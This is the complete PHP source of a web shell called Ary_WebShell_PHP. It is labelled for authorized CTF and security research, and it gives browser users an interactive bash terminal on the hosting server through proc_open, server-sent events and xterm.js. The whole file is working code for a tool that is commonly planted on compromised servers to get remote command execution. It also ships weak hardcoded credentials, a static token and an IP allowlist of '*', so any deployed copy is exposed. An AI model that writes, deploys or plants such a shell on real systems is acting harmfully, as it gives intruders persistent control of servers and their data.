<?php
/**
 * Ary_WebShell_PHP
 *
 * A browser-based interactive terminal webshell for authorized CTF 
 * competitions and authorized security research use only.
 *
 * @author     Aryan Giri | giriaryan694-a11y
 * @license    Apache-2.0
 * @copyright  2026 Aryan Giri
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

session_start();

/* ========================================== */
/* --- USER SECURITY & CONFIGURATION -------- */
/* ========================================== */
define('CONFIG_USERNAME', 'admin');
define('CONFIG_PASSWORD', 'password123');
define('STATIC_TOKEN', 'securetoken123');

// Set to "*" to allow anyone, or specify IPs like: ["127.0.0.1", "192.168.1.15"]
$ALLOWED_IPS = ["*"];
/* ========================================== */

/* --- IP Allowlist --- */
function is_ip_allowed(): bool {
    global $ALLOWED_IPS;
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    foreach ($ALLOWED_IPS as $allowed) {
        if ($allowed === '*' || $allowed === $ip) {
            return true;
        }
    }
    return false;
}

if (!is_ip_allowed()) {
    http_response_code(403);
    die('<h1>403 Forbidden</h1><p>Unauthorized IP address.</p>');
}

/* --- Auth --- */
function require_auth(): void {
    if (empty($_SESSION['ary_auth']) || $_SESSION['ary_auth'] !== true) {
        http_response_code(401);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
        exit;
    }
}

/* --- Cleanup old shell --- */
function kill_old_shell(): void {
    $sid = session_id();
    $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
    if (file_exists($pidFile)) {
        $oldPid = (int) file_get_contents($pidFile);
        if ($oldPid > 0 && function_exists('posix_kill')) {
            $sigkill = defined('SIGKILL') ? SIGKILL : 9;
            @posix_kill($oldPid, $sigkill);
            @posix_kill(-$oldPid, $sigkill); // process group
        }
        @unlink($pidFile);
    }
    $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
    @unlink($inputFile);
}

/* --- Routing --- */
$action = $_GET['action'] ?? 'login';

switch ($action) {
    case 'api_login':
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents('php://input'), true);
        $user = $data['username'] ?? '';
        $pass = $data['password'] ?? '';
        
        if ($user === CONFIG_USERNAME && $pass === CONFIG_PASSWORD) {
            $_SESSION['ary_auth'] = true;
            $_SESSION['ary_token'] = STATIC_TOKEN;
            echo json_encode(['status' => 'ok', 'token' => STATIC_TOKEN]);
        } else {
            http_response_code(401);
            echo json_encode(['status' => 'error', 'message' => 'Invalid credentials']);
        }
        exit;

    case 'stream':
        require_auth();
        session_write_close(); // Release session lock so /input requests don't block
        
        header('Content-Type: text/event-stream');
        header('Cache-Control: no-cache');
        header('Connection: keep-alive');
        header('X-Accel-Buffering: no'); // Prevent nginx buffering
        
        ignore_user_abort(true);
        set_time_limit(0);
        if (ob_get_level() > 0) ob_end_flush();
        ob_implicit_flush(true);
        
        $sid = session_id();
        $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
        $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
        
        kill_old_shell();
        file_put_contents($inputFile, '');
        
        // Try PTY first (PHP 8.1+) so signals like Ctrl+C work natively
        $descriptorspec = [];
        if (PHP_VERSION_ID >= 80100) {
            $descriptorspec = [
                0 => ['pty'],
                1 => ['pty'],
                2 => ['pty']
            ];
        }
        
        $env = ['TERM' => 'xterm-256color', 'HOME' => sys_get_temp_dir()];
        $cwd = sys_get_temp_dir();
        $process = @proc_open('/bin/bash -i', $descriptorspec, $pipes, $cwd, $env);
        
        // Fallback to pipes if PTY is unavailable
        if (!is_resource($process)) {
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open('/bin/bash -i', $descriptorspec, $pipes, $cwd, $env);
        }
        
        if (!is_resource($process)) {
            echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Failed to spawn shell\x1b[0m\r\n"]) . "\n\n";
            exit;
        }
        
        $status = proc_get_status($process);
        file_put_contents($pidFile, $status['pid']);
        
        if (isset($pipes[1]) && is_resource($pipes[1])) stream_set_blocking($pipes[1], false);
        if (isset($pipes[2]) && is_resource($pipes[2])) stream_set_blocking($pipes[2], false);
        if (isset($pipes[0]) && is_resource($pipes[0])) stream_set_blocking($pipes[0], false);
        
        // Welcome message
        echo "data: " . json_encode(['out' => "\r\n\x1b[32m[*] ARY_WebShell_PHP connected — type your commands below\x1b[0m\r\n"]) . "\n\n";
        flush();
        
        while (true) {
            if (connection_aborted()) {
                break;
            }
            
            // Atomic read + clear of input buffer so rapid keys don't race
            if (file_exists($inputFile)) {
                $fp = fopen($inputFile, 'c+');
                $input = '';
                if ($fp) {
                    if (flock($fp, LOCK_EX)) {
                        fseek($fp, 0);
                        $input = stream_get_contents($fp);
                        ftruncate($fp, 0);
                        flock($fp, LOCK_UN);
                    }
                    fclose($fp);
                    
                    if ($input !== '' && isset($pipes[0]) && is_resource($pipes[0])) {
                        fwrite($pipes[0], $input);
                        fflush($pipes[0]);
                    }
                }
            }
            
            $out = '';
            
            if (isset($pipes[1]) && is_resource($pipes[1])) {
                $buf = fread($pipes[1], 4096);
                if ($buf !== false && $buf !== '') {
                    $out .= $buf;
                }
            }
            if (isset($pipes[2]) && is_resource($pipes[2])) {
                $buf = fread($pipes[2], 4096);
                if ($buf !== false && $buf !== '') {
                    $out .= $buf;
                }
            }
            
            if ($out !== '') {
                echo "data: " . json_encode(['out' => $out]) . "\n\n";
                flush();
            }
            
            // SSE comment heartbeat to keep connection alive
            echo ":hb\n\n";
            flush();
            
            $status = proc_get_status($process);
            if (!$status['running']) {
                echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Shell process terminated\x1b[0m\r\n"]) . "\n\n";
                flush();
                break;
            }
            
            usleep(50000); // 50ms poll
        }
        
        @proc_terminate($process);
        @proc_close($process);
        @unlink($inputFile);
        @unlink($pidFile);
        exit;

    case 'input':
        require_auth();
        session_write_close();
        
        header('Content-Type: application/json');
        $data = json_decode(file_get_contents('php://input'), true);
        $key = $data['key'] ?? '';
        
        $sid = session_id();
        $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
        $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
        
        file_put_contents($inputFile, $key, FILE_APPEND | LOCK_EX);
        
        // Ctrl+C (ETX, \x03) needs an explicit SIGINT when running in pipe
        // fallback mode. In PTY mode the kernel handles it, but sending an
        // extra signal is harmless and guarantees it works everywhere.
        if (strpos($key, "\x03") !== false && file_exists($pidFile)) {
            $pid = (int) file_get_contents($pidFile);
            if ($pid > 0 && function_exists('posix_kill')) {
                $sigint = defined('SIGINT') ? SIGINT : 2;
                @posix_kill($pid, $sigint);      // direct signal
                @posix_kill(-$pid, $sigint);     // process group (best-effort)
            }
        }
        
        echo json_encode(['status' => 'ok']);
        exit;

    case 'resize':
        require_auth();
        session_write_close();
        header('Content-Type: application/json');
        // Resize via stty requires PTY ioctl; not easily available in pure PHP.
        // If running under a real PTY, the kernel usually handles basic resize automatically.
        echo json_encode(['status' => 'ok']);
        exit;

    case 'logout':
        kill_old_shell();
        session_destroy();
        header('Location: ?action=login');
        exit;

    case 'terminal':
        require_auth();
        // Fall through to HTML output
        break;

    case 'login':
    default:
        // Fall through to HTML output
        break;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <?php if ($action === 'login'): ?>
    <title>ARY_Webshell Login</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: #1a1b26;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #24283b;
            padding: 2.5rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 320px;
            text-align: center;
        }
        h2 { color: #a9b1d6; margin-top: 0; margin-bottom: 5px; }
        .subtitle { color: #565f89; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #414868;
            border-radius: 6px;
            background: #16161e;
            color: #c0caf5;
            outline: none;
            transition: border 0.3s;
        }
        input:focus { border-color: #7aa2f7; }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #7aa2f7;
            color: #1a1b26;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:hover { opacity: 0.8; }
        .credit {
            margin-top: 25px;
            color: #414868;
            font-size: 11px;
            letter-spacing: 1px;
            /* REMOVED: text-transform: uppercase; */
        }
        .license {
            margin-top: 10px;
            color: #414868;
            font-size: 10px;
        }
    </style>
    <?php elseif ($action === 'terminal'): ?>
    <title>ARY_Webshell Terminal</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@latest/css/xterm.css" />
    <style>
        html, body { height: 100%; width: 100%; margin: 0; padding: 0; background: #000; overflow: hidden; }
        body { display: flex; flex-direction: column; }
        #toolbar {
            flex: 0 0 50px;
            display: flex;
            background: #16161e;
            padding: 5px;
            gap: 5px;
            overflow-x: auto;
            box-sizing: border-box;
            z-index: 100;
        }
        .t-btn {
            flex: 1;
            min-width: 45px;
            background: #24283b;
            color: #a9b1d6;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            user-select: none;
            touch-action: manipulation;
        }
        .t-btn:active { background: #414868; }
        #terminal { flex: 1; position: relative; padding: 4px; box-sizing: border-box; overflow: hidden; }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/xterm@latest/lib/xterm.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@latest/lib/xterm-addon-fit.js"></script>
    <?php endif; ?>
</head>
<body>
<?php if ($action === 'login'): ?>
    <div class="card">
        <h2>ARY_WebShell_PHP</h2>
        <div class="subtitle">Secure Remote Terminal</div>
        <input id="u" placeholder="Username" autocomplete="off">
        <input id="p" type="password" placeholder="Password" onkeydown="if(event.key==='Enter') login()">
        <button onclick="login()">Connect</button>
        <div class="credit">made by aryan giri | giriaryan694-a11y</div>
        <div class="license">Licensed under Apache-2.0</div>
    </div>
    <script>
        function login() {
            const uv = document.getElementById('u').value;
            const pv = document.getElementById('p').value;
            fetch('?action=api_login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: uv, password: pv})
            }).then(r => {
                if (!r.ok) throw new Error('Invalid Credentials');
                return r.json();
            }).then(d => {
                if(d.status === 'ok') {
                    document.cookie = 'auth=' + d.token + '; path=/; SameSite=Strict;';
                    sessionStorage.setItem('token', d.token);
                    window.location.href = '?action=terminal';
                }
            }).catch(e => alert(e.message));
        }
    </script>

<?php elseif ($action === 'terminal'): ?>
    <script>sessionStorage.setItem('token', '<?php echo STATIC_TOKEN; ?>');</script>
    <div id="toolbar">
        <button id="btn-ctrl" class="t-btn" onclick="toggleCtrl()">CTRL</button>
        <button class="t-btn" onclick="sKey('\x1b')">ESC</button>
        <button class="t-btn" onclick="sKey('\x09')">TAB</button>
        <button class="t-btn" onclick="sKey('\x1b[D')">&lt;</button>
        <button class="t-btn" onclick="sKey('\x1b[B')">DN</button>
        <button class="t-btn" onclick="sKey('\x1b[A')">UP</button>
        <button class="t-btn" onclick="sKey('\x1b[C')">&gt;</button>
        <button class="t-btn" onclick="sKey('\x03')">^C</button>
    </div>
    <div id="terminal"></div>
    <script>
        const term = new Terminal({ cursorBlink: true, theme: { background: '#000000' } });
        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(document.getElementById('terminal'));

        function resizeTerminal() {
            try { fitAddon.fit(); } catch(e) {}
        }
        resizeTerminal();
        window.addEventListener('resize', resizeTerminal);

        let isCtrl = false;

        function toggleCtrl() {
            isCtrl = !isCtrl;
            document.getElementById('btn-ctrl').style.color = isCtrl ? '#7aa2f7' : '#a9b1d6';
            term.focus(); // CRITICAL: refocus terminal so keyboard goes to xterm, not the button
        }

        const token = sessionStorage.getItem('token');
        if (!token) window.location.href = '?action=login';

        // SSE connection for shell output (PHP session cookie handles auth automatically)
        const evtSource = new EventSource('?action=stream');
        evtSource.onmessage = e => {
            const d = JSON.parse(e.data);
            if(d.out) term.write(d.out);
        };

        evtSource.onopen = () => {
            term.focus();
            resizeTerminal();
        };

        evtSource.onerror = () => {
            term.write('\r\n\x1b[31m[!] Connection Lost. Wiping session and redirecting...\x1b[0m\r\n');
            document.cookie = 'auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            sessionStorage.removeItem('token');
            setTimeout(() => window.location.href = '?action=login', 1500);
        };

        function sendKey(k) {
            fetch('?action=input', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({key: k})
            });
        }

        function sKey(k) {
            // If user had on-screen Ctrl pending, cancel it when using explicit buttons
            if (isCtrl) toggleCtrl();
            sendKey(k);
            term.focus();
        }

        // Smart copy: Ctrl+C copies when text is selected, otherwise sends ^C to shell.
        // All other physical Ctrl combos (Ctrl+D, Ctrl+Z, etc.) pass through xterm.js naturally.
        term.attachCustomKeyEventHandler((ev) => {
            if (ev.type === 'keydown' && ev.ctrlKey && (ev.key === 'c' || ev.code === 'KeyC')) {
                if (term.hasSelection()) {
                    return true; // Let browser/xterm handle copy
                }
                ev.preventDefault();
                sendKey('\x03');
                return false; // Stop xterm.js from processing this key
            }
            return true; // Let every other key process normally
        });

        term.onData(d => {
            // On-screen Ctrl mode: convert next typed letter to control character
            if (isCtrl) {
                if (d.length === 1) {
                    let c = d.charCodeAt(0);
                    if (c >= 97 && c <= 122) d = String.fromCharCode(c - 96);      // a-z -> ^A-^Z
                    else if (c >= 65 && c <= 90) d = String.fromCharCode(c - 64);   // A-Z -> ^A-^Z
                }
                toggleCtrl(); // Consume Ctrl mode after one keystroke
            }
            sendKey(d);
        });

        // Notify server of terminal resize
        let resizeTimer;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimer);
            resizeTimer = setTimeout(() => {
                const dims = {cols: term.cols, rows: term.rows};
                fetch('?action=resize', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(dims)
                });
            }, 300);
        });
    </script>
<?php endif; ?>
</body>
</html>
